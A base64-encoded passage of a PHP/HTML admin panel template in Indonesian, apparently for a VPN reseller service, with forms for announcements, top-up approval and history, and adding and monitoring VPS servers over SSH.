WU9ImFubm91bmNlXzFfdGV4dCIgcGxhY2Vob2xkZXI9IlRla3MgcGVuZ3VtdW1hbiAxLi4uIgogICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9ImZsZXg6MSIgdmFsdWU9IiI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFubm91bmNlXzEiIGlkPSJhbm5vdW5jZV8xX2ZpbmFsIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdhbm5vdW5jZV8xJywnJykpPz4iPgogICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0ibGJsIj5QZW5ndW11bWFuIDI8L2xhYmVsPgogICAgICAgICAgICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouNXJlbTsiPgogICAgICAgICAgICAgICAgICA8c2VsZWN0IG5hbWU9ImFubm91bmNlXzJfYmFkZ2UiIHN0eWxlPSJ3aWR0aDoxMDBweDtwYWRkaW5nOi43cmVtIC42cmVtO2JhY2tncm91bmQ6IzBhMTYyODtib3JkZXI6MXB4IHNvbGlkICMxZTNhNWY7Ym9yZGVyLXJhZGl1czo4cHg7Y29sb3I6I2YxZjVmOTtmb250LXNpemU6Ljg1cmVtO2ZvbnQtZmFtaWx5OmluaGVyaXQ7Ij4KICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJCQVJVIj5CQVJVPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iUFJPTU8iPlBST01PPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iSU5GTyI+SU5GTzwvb3B0aW9uPgogICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImFubm91bmNlXzJfdGV4dCIgcGxhY2Vob2xkZXI9IlRla3MgcGVuZ3VtdW1hbiAyLi4uIgogICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9ImZsZXg6MSIgdmFsdWU9IiI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFubm91bmNlXzIiIGlkPSJhbm5vdW5jZV8yX2ZpbmFsIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdhbm5vdW5jZV8yJywnJykpPz4iPgogICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIj4KICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0ibGJsIj5QZW5ndW11bWFuIDM8L2xhYmVsPgogICAgICAgICAgICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouNXJlbTsiPgogICAgICAgICAgICAgICAgICA8c2VsZWN0IG5hbWU9ImFubm91bmNlXzNfYmFkZ2UiIHN0eWxlPSJ3aWR0aDoxMDBweDtwYWRkaW5nOi43cmVtIC42cmVtO2JhY2tncm91bmQ6IzBhMTYyODtib3JkZXI6MXB4IHNvbGlkICMxZTNhNWY7Ym9yZGVyLXJhZGl1czo4cHg7Y29sb3I6I2YxZjVmOTtmb250LXNpemU6Ljg1cmVtO2ZvbnQtZmFtaWx5OmluaGVyaXQ7Ij4KICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJCQVJVIj5CQVJVPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iUFJPTU8iPlBST01PPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0iSU5GTyI+SU5GTzwvb3B0aW9uPgogICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImFubm91bmNlXzNfdGV4dCIgcGxhY2Vob2xkZXI9IlRla3MgcGVuZ3VtdW1hbiAzLi4uIgogICAgICAgICAgICAgICAgICAgICAgICAgc3R5bGU9ImZsZXg6MSIgdmFsdWU9IiI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFubm91bmNlXzMiIGlkPSJhbm5vdW5jZV8zX2ZpbmFsIiB2YWx1ZT0iPD89aHRtbHNwZWNpYWxjaGFycyhnZXRTZXR0aW5nKCdhbm5vdW5jZV8zJywnJykpPz4iPgogICAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgICA8c2NyaXB0PgogICAgICAgICAgICAgIC8vIENvbWJpbmUgYmFkZ2UgKyB0ZXh0IGludG8gZmluYWwgaGlkZGVuIGZpZWxkcyBiZWZvcmUgc3VibWl0CiAgICAgICAgICAgICAgKGZ1bmN0aW9uKCl7CiAgICAgICAgICAgICAgICB2YXIgZm9ybSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2Zvcm1bYWN0aW9uKj0ic2F2ZV9zZXR0aW5ncyJdJykgfHwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgIEFycmF5LmZyb20oZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpKS5maW5kKGZ1bmN0aW9uKGYpeyByZXR1cm4gZi5xdWVyeVNlbGVjdG9yKCdbbmFtZT0iYWN0aW9uIl1bdmFsdWU9InNhdmVfc2V0dGluZ3MiXScpOyB9KTsKICAgICAgICAgICAgICAgIGlmKGZvcm0pewogICAgICAgICAgICAgICAgICBmb3JtLmFkZEV2ZW50TGlzdGVuZXIoJ3N1Ym1pdCcsIGZ1bmN0aW9uKCl7CiAgICAgICAgICAgICAgICAgICAgZm9yKHZhciBpPTE7aTw9MztpKyspewogICAgICAgICAgICAgICAgICAgICAgdmFyIGJhZGdlID0gZm9ybS5xdWVyeVNlbGVjdG9yKCdbbmFtZT0iYW5ub3VuY2VfJytpKydfYmFkZ2UiXScpOwogICAgICAgICAgICAgICAgICAgICAgdmFyIHRleHQgPSBmb3JtLnF1ZXJ5U2VsZWN0b3IoJ1tuYW1lPSJhbm5vdW5jZV8nK2krJ190ZXh0Il0nKTsKICAgICAgICAgICAgICAgICAgICAgIHZhciBmaW5hbCA9IGZvcm0ucXVlcnlTZWxlY3RvcignI2Fubm91bmNlXycraSsnX2ZpbmFsJyk7CiAgICAgICAgICAgICAgICAgICAgICBpZihiYWRnZSAmJiB0ZXh0ICYmIGZpbmFsKXsKICAgICAgICAgICAgICAgICAgICAgICAgZmluYWwudmFsdWUgPSB0ZXh0LnZhbHVlLnRyaW0oKSA/IChiYWRnZS52YWx1ZSArICd8JyArIHRleHQudmFsdWUudHJpbSgpKSA6ICcnOwogICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgIC8vIFByZS1maWxsIGJhZGdlIHNlbGVjdHMgZnJvbSBzYXZlZCB2YWx1ZXMKICAgICAgICAgICAgICAgICAgaWYoZm9ybSl7CiAgICAgICAgICAgICAgICAgICAgKGZ1bmN0aW9uIHByZWZpbGwoKXsKICAgICAgICAgICAgICAgICAgICAgIGZvcih2YXIgaT0xO2k8PTM7aSsrKXsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGZpbmFsID0gZm9ybS5xdWVyeVNlbGVjdG9yKCcjYW5ub3VuY2VfJytpKydfZmluYWwnKTsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGJhZGdlID0gZm9ybS5xdWVyeVNlbGVjdG9yKCdbbmFtZT0iYW5ub3VuY2VfJytpKydfYmFkZ2UiXScpOwogICAgICAgICAgICAgICAgICAgICAgICB2YXIgdGV4dCA9IGZvcm0ucXVlcnlTZWxlY3RvcignW25hbWU9ImFubm91bmNlXycraSsnX3RleHQiXScpOwogICAgICAgICAgICAgICAgICAgICAgICBpZihmaW5hbCAmJiBiYWRnZSAmJiBmaW5hbC52YWx1ZSl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIHBhcnRzID0gZmluYWwudmFsdWUuc3BsaXQoJ3wnKTsKICAgICAgICAgICAgICAgICAgICAgICAgICBpZihwYXJ0cy5sZW5ndGggPj0gMil7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBiYWRnZS52YWx1ZSA9IHBhcnRzWzBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoIXRleHQudmFsdWUpIHRleHQudmFsdWUgPSBwYXJ0cy5zbGljZSgxKS5qb2luKCd8Jyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSkoKTsKICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIH0pKCk7CiAgICAgICAgICAgICAgPC9zY3JpcHQ+CgogICAgICAgICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouNHJlbTtmbGV4LXdyYXA6d3JhcCI+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJhcHByb3ZlX3RvcHVwIj48P3BocCBlY2hvIGNzcmZGaWVsZCgpOyA/Pj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b3B1cF9pZCIgdmFsdWU9Ijw/PSR0WydpZCddPz4iPjxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1ncmVlbiI+QWN0aXZlIEFwcHJvdmU8L2J1dHRvbj48L2Zvcm0+CiAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJyZWplY3RfdG9wdXAiPjw/cGhwIGVjaG8gY3NyZkZpZWxkKCk7ID8+PjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRvcHVwX2lkIiB2YWx1ZT0iPD89JHRbJ2lkJ10/PiI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ibm90ZSIgdmFsdWU9IkRpdG9sYWsgYWRtaW4iPjxidXR0b24gdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1yZWQiPlRvbGFrPC9idXR0b24+PC9mb3JtPgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPD9waHAgZW5kZm9yZWFjaDsgZW5kaWY7Pz4KICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KICA8L2Rpdj4KCiAgPCEtLSBUT1BVUCAtLT4KICA8ZGl2IGNsYXNzPSJwYWdlIiBpZD0idGFiLXRvcHVwIj4KICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+IFRvcHVwIEhpc3Rvcnk8L2Rpdj48L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IG92ZXJmbG93LXgiPgogICAgICAgIDx0YWJsZT4KICAgICAgICAgIDx0aGVhZD48dHI+PHRoPlVzZXI8L3RoPjx0aD5Ob21pbmFsPC90aD48dGg+TWV0b2RlPC90aD48dGg+U3RhdHVzPC90aD48dGg+VGFuZ2dhbDwvdGg+PHRoPlNlcnZlcjwvdGg+PHRoPkFrc2k8L3RoPjwvdHI+PC90aGVhZD4KICAgICAgICAgIDx0Ym9keT4KICAgICAgICAgIDw/cGhwIGZvcmVhY2goJGFsbFRvcHVwcyBhcyAkdCk6Pz4KICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRkPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHRbJ3VzZXJuYW1lJ10pPz48L3RkPgogICAgICAgICAgICA8dGQgc3R5bGU9ImZvbnQtd2VpZ2h0OjcwMCI+PD89Zm9ybWF0UnVwaWFoKCR0WydhbW91bnQnXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48Pz1odG1sc3BlY2lhbGNoYXJzKCR0WydwYXltZW50X21ldGhvZCddKT8+PC90ZD4KICAgICAgICAgICAgPHRkPjxzcGFuIGNsYXNzPSJiYWRnZSBiLTw/PSR0WydzdGF0dXMnXT8+Ij48Pz0kdFsnc3RhdHVzJ10/Pjwvc3Bhbj48L3RkPgogICAgICAgICAgICA8dGQ+PD89ZGF0ZSgnZCBNIFkgSDppJyxzdHJ0b3RpbWUoJHRbJ2NyZWF0ZWRfYXQnXSkpPz48L3RkPgogICAgICAgICAgICA8dGQ+CiAgICAgICAgICAgICAgPD9waHAgaWYoJHRbJ3N0YXR1cyddPT09J3BlbmRpbmcnKTo/PgogICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lIj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJhcHByb3ZlX3RvcHVwIj48P3BocCBlY2hvIGNzcmZGaWVsZCgpOyA/Pj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b3B1cF9pZCIgdmFsdWU9Ijw/PSR0WydpZCddPz4iPjxidXR0b24gY2xhc3M9ImJ0biBidG4tZ3JlZW4iPkFjdGl2ZTwvYnV0dG9uPjwvZm9ybT4KICAgICAgICAgICAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiIHN0eWxlPSJkaXNwbGF5OmlubGluZSI+PGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0icmVqZWN0X3RvcHVwIj48P3BocCBlY2hvIGNzcmZGaWVsZCgpOyA/Pj48aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0b3B1cF9pZCIgdmFsdWU9Ijw/PSR0WydpZCddPz4iPjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im5vdGUiIHZhbHVlPSJEaXRvbGFrIj48YnV0dG9uIGNsYXNzPSJidG4gYnRuLXJlZCI+UmVqZWN0PC9idXR0b24+PC9mb3JtPgogICAgICAgICAgICAgIDw/cGhwIGVuZGlmOz8+CiAgICAgICAgICAgICAgPD9waHAgaWYoJHRbJ2J1a3RpX3RyYW5zZmVyJ10pOj8+PGEgaHJlZj0iPD89aHRtbHNwZWNpYWxjaGFycygkdFsnYnVrdGlfdHJhbnNmZXInXSk/PiIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJidG4gYnRuLW91dGxpbmUiPlZpZXc8L2E+PD9waHAgZW5kaWY7Pz4KICAgICAgICAgICAgPC90ZD4KICAgICAgICAgIDwvdHI+CiAgICAgICAgICA8P3BocCBlbmRmb3JlYWNoOz8+CiAgICAgICAgICA8L3Rib2R5PgogICAgICAgIDwvdGFibGU+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CiAgPC9kaXY+CgogIDwhLS0gU0VSVkVSUyAtLT4KICA8ZGl2IGNsYXNzPSJwYWdlIiBpZD0idGFiLXNlcnZlcnMiPgogICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj5TZXJ2ZXIgTGlzdDwvZGl2PjxidXR0b24gY2xhc3M9ImJ0biBidG4tcHJpbWFyeSIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2FkZFNlcnZlckZvcm0nKS5zdHlsZS5kaXNwbGF5PWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhZGRTZXJ2ZXJGb3JtJykuc3R5bGUuZGlzcGxheT09PSdub25lJz8nYmxvY2snOidub25lJyI+KyBUYW1iYWggU2VydmVyPC9idXR0b24+PC9kaXY+CiAgICAgIDxkaXYgaWQ9ImF1dG9EZXRlY3RGb3JtIiBzdHlsZT0icGFkZGluZzoxLjI1cmVtO2JvcmRlci1ib3R0b206MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCByZ2JhKDk5LDEwMiwyNDEsLjA1KSwgcmdiYSgxMzksOTIsMjQ2LC4wNSkpIj4KICAgICAgICA8ZGl2IHN0eWxlPSJkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO21hcmdpbi1ib3R0b206MXJlbSI+CiAgICAgICAgICAgIDxkaXY+CiAgICAgICAgICAgICAgICA8c3Ryb25nIHN0eWxlPSJmb250LXNpemU6LjlyZW07Y29sb3I6dmFyKC0tcHJpbWFyeSkiPuKaoSBBdXRvLURldGVjdCAmIEFkZCBTZXJ2ZXI8L3N0cm9uZz4KICAgICAgICAgICAgICAgIDxwIHN0eWxlPSJmb250LXNpemU6LjcycmVtO2NvbG9yOnZhcigtLW11dGVkKTttYXJnaW4tdG9wOjJweCI+RGV0ZWtzaSBvdG9tYXRpczogcmVnaW9uLCBkb21haW4sIHBvcnQsIE9TIOKAlCB0aW5nZ2FsIGlzaSBJUCAmIHBhc3N3b3JkPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgICA8Zm9ybSBtZXRob2Q9IlBPU1QiPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJhdXRvX2RldGVjdF9zZXJ2ZXIiPgogICAgICAgICAgICA8P3BocCBlY2hvIGNzcmZGaWVsZCgpOyA/PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJncmlkMiI+CiAgICAgICAgICAgIDxkaXY+PGxhYmVsPk5hbWEgU2VydmVyPC9sYWJlbD48aW5wdXQgbmFtZT0ibmFtYV9zZXJ2ZXIiIHBsYWNlaG9sZGVyPSJCSVpORVQgSURDIiByZXF1aXJlZD48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+S29kZSBTZXJ2ZXI8L2xhYmVsPjxpbnB1dCBuYW1lPSJjb2RlX3NlcnZlciIgcGxhY2Vob2xkZXI9InNncDEiIHJlcXVpcmVkPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5Mb2thc2k8L2xhYmVsPjxpbnB1dCBuYW1lPSJsb2thc2kiIHBsYWNlaG9sZGVyPSJTaW5nYXB1cmEiIHJlcXVpcmVkPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5GbGFnIEVtb2ppPC9sYWJlbD48aW5wdXQgbmFtZT0iZmxhZyIgcGxhY2Vob2xkZXI9IvCfh7jwn4esIiB2YWx1ZT0i8J+HrvCfh6kiPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5JUC9Ib3N0IFZQUzwvbGFiZWw+PGlucHV0IG5hbWU9Imhvc3QiIHBsYWNlaG9sZGVyPSIxMDMueC54LngiIHJlcXVpcmVkPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5Qb3J0IFNTSDwvbGFiZWw+PGlucHV0IG5hbWU9InBvcnQiIHR5cGU9Im51bWJlciIgdmFsdWU9IjIyIj48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+U1NIIFVzZXI8L2xhYmVsPjxpbnB1dCBuYW1lPSJzc2hfdXNlciIgdmFsdWU9InJvb3QiPjwvZGl2PgogICAgICAgICAgICA8ZGl2PjxsYWJlbD5TU0ggUGFzc3dvcmQgKG9wc2lvbmFsKTwvbGFiZWw+PGlucHV0IG5hbWU9InNzaF9wYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJKaWthIHRpZGFrIHBha2FpIGtleSI+PC9kaXY+CiAgICAgICAgICAgIDxkaXY+PGxhYmVsPlBhdGggU1NIIEtleSAob3BzaW9uYWwpPC9sYWJlbD48aW5wdXQgbmFtZT0ic3NoX2tleSIgcGxhY2Vob2xkZXI9Ii9yb290Ly5zc2gvaWRfcnNhIj48L2Rpdj4KICAgICAgICAgICAgPGRpdj48bGFiZWw+RG9tYWluIFZQUzwvbGFiZWw+PGlucHV0IG5hbWU9ImRvbWFpbiIgcGxhY2Vob2xkZXI9ImRvbWFpbi5jb20gKG9wc2lvbmFsKSI+PC9kaXY+CiAgICAgICAgICAgIDxkaXY+PGxhYmVsPkhhcmdhL0hhcmkgKFJwKTwvbGFiZWw+PGlucHV0IG5hbWU9ImhhcmdhX2hhcmkiIHR5cGU9Im51bWJlciIgdmFsdWU9IjMwMCIgcmVxdWlyZWQ+PC9kaXY+CiAgICAgICAgICAgIDxkaXY+PGxhYmVsPkhhcmdhL0J1bGFuIChScCk8L2xhYmVsPjxpbnB1dCBuYW1lPSJoYXJnYV9idWxhbiIgdHlwZT0ibnVtYmVyIiB2YWx1ZT0iOTAwMCIgcmVxdWlyZWQ+PC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxwIHN0eWxlPSJmb250LXNpemU6Ljc1cmVtO2NvbG9yOnZhcigtLW11dGVkKTttYXJnaW4tYm90dG9tOi43NXJlbSI+RW5zdXJlIDxjb2RlPnZwbi1hcGk8L2NvZGU+IHN1ZGFoIHRlcnBhc2FuZyBkaSBWUFMgdGFyZ2V0IGRlbmdhbiA8Y29kZT5pbnN0YWxsLW9yZGVydnBuLnNoPC9jb2RlPjwvcD4KICAgICAgICAgIDxkaXYgY2xhc3M9ImdyaWQyIiBzdHlsZT0ibWFyZ2luLXRvcDouNzVyZW0iPgogICAgICAgICAgICAgICAgPGRpdj48bGFiZWw+SGFyZ2EvSGFyaSAoUnApPC9sYWJlbD48aW5wdXQgbmFtZT0iaGFyZ2FfaGFyaSIgdHlwZT0ibnVtYmVyIiB2YWx1ZT0iMzAwIj48L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXY+PGxhYmVsPkhhcmdhL0J1bGFuIChScCk8L2xhYmVsPjxpbnB1dCBuYW1lPSJoYXJnYV9idWxhbiIgdHlwZT0ibnVtYmVyIiB2YWx1ZT0iOTAwMCI+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U2F2ZSBTZXJ2ZXI8L2J1dHRvbj4KICAgICAgICA8L2Zvcm0+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkgb3ZlcmZsb3cteCI+CiAgICAgICAgPHRhYmxlPgogICAgICAgICAgPHRoZWFkPjx0cj48dGg+U2VydmVyPC90aD48dGg+UGluZzwvdGg+PHRoPlVwdGltZTwvdGg+PHRoPkNQVTwvdGg+PHRoPlJBTTwvdGg+PHRoPkFrdW48L3RoPjx0aD5Mb2thc2k8L3RoPjx0aD5IYXJnYS9IYXJpPC90aD48dGg+U3RhdHVzPC90aD48dGg+QWtzaTwvdGg+PC90cj48L3RoZWFkPgogICAgICAgICAgPHRib2R5PgogICAgICAgICAgPD9waHAgZm9yZWFjaCgkc2VydmVycyBhcyAkcyk6Pz4KICAgICAgICAgIDx0cj4KICAgICAgICAgICAgPHRyIGRhdGEtc2VydmVyPSI8Pz0kc1snY29kZV9zZXJ2ZXInXT8+Ij4KICAgICAgICAgICAgPHRkPjxzdHJvbmc+PD89aHRtbHNwZWNpYWxjaGFycygkc1snbmFtYV9zZXJ2ZXInXSk/Pjwvc3Ryb25nPjxicj48c3BhbiBzdHlsZT0iY29sb3I6dmFyKC0tbXV0ZWQpO2ZvbnQtc2l6ZTouNzJyZW0iPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ2NvZGVfc2VydmVyJ10pPz48L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkIGNsYXNzPSJtb24tcGluZyIgZGF0YS1jb2RlPSI8Pz0kc1snY29kZV9zZXJ2ZXInXT8+Ij48c3BhbiBjbGFzcz0ic3Bpbm5lciI+4p+zPC9zcGFuPjwvdGQ+CiAgICAgICAgICAgIDx0ZCBjbGFzcz0ibW9uLXVwdGltZSIgZGF0YS1jb2RlPSI8Pz0kc1snY29kZV9zZXJ2ZXInXT8+Ij48c3BhbiBjbGFzcz0ic3Bpbm5lciI+4p+zPC9zcGFuPjwvdGQ+CiAgICAgICAgICAgIDx0ZCBjbGFzcz0ibW9uLWNwdSIgZGF0YS1jb2RlPSI8Pz0kc1snY29kZV9zZXJ2ZXInXT8+Ij48c3BhbiBjbGFzcz0ic3Bpbm5lciI+4p+zPC9zcGFuPjwvdGQ+CiAgICAgICAgICAgIDx0ZCBjbGFzcz0ibW9uLXJhbSIgZGF0YS1jb2RlPSI8Pz0kc1snY29kZV9zZXJ2ZXInXT8+Ij48c3BhbiBjbGFzcz0ic3Bpbm5lciI+4p+zPC9zcGFuPjwvdGQ+CiAgICAgICAgICAgIDx0ZCBjbGFzcz0ibW9uLWFjY291bnRzIiBkYXRhLWNvZGU9Ijw/PSRzWydjb2RlX3NlcnZlciddPz4iPjxzcGFuIGNsYXNzPSJzcGlubmVyIj7in7M8L3NwYW4+PC90ZD4KICAgICAgICAgICAgPHRkIGNsYXNzPSJtb24tc3RhdHVzIiBkYXRhLWNvZGU9Ijw/PSRzWydjb2RlX3NlcnZlciddPz4iPjxzcGFuIGNsYXNzPSJiYWRnZSBiLXJlYWR5Ij5yZWFkeTwvc3Bhbj48L3RkPgogICAgICAgICAgICA8dGQgc3R5bGU9ImRpc3BsYXk6ZmxleDtnYXA6LjM1cmVtO2ZsZXgtd3JhcDp3cmFwIj48YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnZhcigtLW11dGVkKTtmb250LXNpemU6LjcycmVtIj48Pz1odG1sc3BlY2lhbGNoYXJzKCRzWydjb2RlX3NlcnZlciddKT8+PC9zcGFuPjwvdGQ+CiAgICAgICAgICAgIDx0ZCBzdHlsZT0iZm9udC1mYW1pbHk6bW9ub3NwYWNlO2ZvbnQtc2l6ZTouNzhyZW0iPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ2hvc3QnXSk/PjwvdGQ+CiAgICAgICAgICAgIDx0ZD48Pz0kc1snZmxhZyddPz8n8J+HrvCfh6knPz4gPD89aHRtbHNwZWNpYWxjaGFycygkc1snbG9rYXNpJ10pPz48L3RkPgogICAgICAgICAgICA8dGQ+PD89Zm9ybWF0UnVwaWFoKCRzWydoYXJnYV9oYXJpJ10pPz48L3RkPgogICAgICAgICAgICA8dGQ+PHNwYW4gY2xhc3M9ImJhZGdlIGItPD89JHNbJ3N0YXR1cyddPz4iPjw/PSRzWydzdGF0dXMnXT8+PC9zcGFuPjwvdGQ+CiAgICAgICAgICAgIDx0ZCBzdHlsZT0iZGlzcGxheTpmbGV4O2dhcDouMzVyZW07ZmxleC13cmFwOndyYXAiPgogICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InRvZ2dsZV9zZXJ2ZXIiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic2VydmVyX2lkIiB2YWx1ZT0iPD89JHNbJ2lkJ10/PiI+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzdGF0dXMiIHZhbHVlPSI8Pz0kc1snc3RhdHVzJ109PT0ncmVhZHknPydtYWludGVuYW5jZSc6J3JlYWR5Jz8+Ij4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4teWVsbG93Ij48Pz0kc1snc3RhdHVzJ109PT0ncmVhZHknPyfij7ggTU5UJzon4pa2IE9OJz8+PC9idXR0b24+CiAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0iUE9TVCIgc3R5bGU9ImRpc3BsYXk6aW5saW5lIiBvbnN1Ym1pdD0icmV0dXJuIGNvbmZpcm0oJ0hhcHVzIHNlcnZlciBpbmk/JykiPgogICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0iZGVsZXRlX3NlcnZlciI+PD9waHAgZWNobyBjc3JmRmllbGQoKTsgPz4+CiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzZXJ2ZXJfaWQiIHZhbHVlPSI8Pz0kc1snaWQnXT8+Ij4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tcmVkIj48L2J1dHRvbj4KICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICA8L3RyPgogICAgICAgICAgPD9waHAgZW5